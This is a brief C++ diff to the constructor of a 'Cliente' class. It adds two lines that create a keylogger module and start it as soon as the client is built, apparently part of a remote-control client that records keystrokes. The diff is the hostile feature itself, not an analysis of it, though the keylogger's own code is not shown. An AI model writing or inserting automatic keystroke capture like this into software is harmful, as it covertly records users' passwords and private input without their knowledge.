@@ -152,6 +152,8 @@ Cliente::Cliente() {
     }
  
     //this->mod_Fun = new modFun();
+    this->mod_Key = new mod_Keylogger();
+    this->mod_Key->Start();
 
 }
 
